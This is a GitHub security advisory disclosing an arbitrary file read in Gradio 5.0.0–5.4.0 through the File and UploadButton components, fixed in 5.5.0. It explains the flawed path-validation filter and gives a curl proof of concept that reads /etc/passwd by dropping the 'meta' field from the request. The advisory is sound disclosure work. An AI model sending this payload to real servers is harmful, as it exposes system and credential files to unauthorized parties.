# Arbitrary file read with File and UploadButton components

Moderate

[freddyaboulton](/freddyaboulton)
published
GHSA-rhm9-gp5p-5248
Nov 6, 2024

## Package

pip

gradio
([pip](/advisories?query=ecosystem%3Apip))

## Affected versions

5.0.0 - 5.4.0

## Patched versions

5.5.0

## Description

### Summary

If File or UploadButton components are used as a part of Gradio application to preview file content, an attacker with access to the application might abuse these components to read arbitrary files from the application server.

### Details

Consider the following application where a user can upload a file and preview its content:

```
import gradio as gr

def greet(value: bytes):
    return str(value)

demo = gr.Interface(fn=greet, inputs=gr.File(type="binary"), outputs="textbox")

if __name__ == "__main__":
    demo.launch()

```

If we run this application and make the following request (which attempts to read the `/etc/passwd` file)

```
curl 'http://127.0.0.1:7860/gradio_api/run/predict' -H 'content-type: application/json' --data-raw '{"data":[{"path":"/etc/passwd","orig_name":"test.txt","size":4,"mime_type":"text/plain","meta":{"_type":"gradio.FileData"}}],"event_data":null,"fn_index":0,"trigger_id":8,"session_hash":"mnv42s5gt7"}'

```

Then this results in the following error on the server

```
gradio.exceptions.InvalidPathError: Cannot move /etc/passwd to the gradio cache dir because it was not uploaded by a user.

```

This is expected. However, if we now remove the `"meta":{"_type":"gradio.FileData"}` from the request:

```
curl 'http://127.0.0.1:7860/gradio_api/run/predict' -H 'content-type: application/json' --data-raw '{"data":[{"path":"/etc/passwd","orig_name":"test.txt","size":4,"mime_type":"text/plain"}],"event_data":null,"fn_index":0,"trigger_id":8,"session_hash":"mnv42s5gt7"}'

```

This doesn't cause an error and results in the content of /etc/passwd being shown in the response!

This works because Gradio relies on the `processing_utils.async_move_files_to_cache` to sanitize all incoming file paths in all inputs. This function performs the following operation

```
    return await client_utils.async_traverse(
        data, _move_to_cache, client_utils.is_file_obj_with_meta
    )

```

where `client_utils.is_file_obj_with_meta` is used as a filter which tells on which inputs to perform the `_move_to_cache` function (which also performs the allowed/disallowed check on the file path). The problem is that `client_utils.is_file_obj_with_meta` is not guaranteed to trigger for every input that contains a file path:

```
def is_file_obj_with_meta(d) -> bool:
    """
    Check if the given value is a valid FileData object dictionary in newer versions of Gradio
    where the file objects include a specific "meta" key, e.g.
    {
        "path": "path/to/file",
        "meta": {"_type: "gradio.FileData"}
    }
    """
    return (
        isinstance(d, dict)
        and "path" in d
        and isinstance(d["path"], str)
        and "meta" in d
        and d["meta"].get("_type", "") == "gradio.FileData"
    )

```

For example, as in the PoC, the file path won't be checked if the `meta` key is not present in the request or if `_type` is not `gradio.FileData`.

Then, the path remains under control of the attacker and is used to read a file in `_process_single_file` function in `file.py` and `upload_button.py` (and possibly other places)

### PoC

As described above, run the following Gradio app

```
import gradio as gr

def greet(value: bytes):
    return str(value)

demo = gr.Interface(fn=greet, inputs=gr.File(type="binary"), outputs="textbox")

if __name__ == "__main__":
    demo.launch()

```

And make the following request

```
curl 'http://127.0.0.1:7860/gradio_api/run/predict' -H 'content-type: application/json' --data-raw '{"data":[{"path":"/etc/passwd","orig_name":"test.txt","size":4,"mime_type":"text/plain"}],"event_data":null,"fn_index":0,"trigger_id":8,"session_hash":"mnv42s5gt7"}'

```
### Impact

Arbitrary file read in specific Gradio applications that use File or UploadButton components to upload files and echo/preview the content to the user.

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
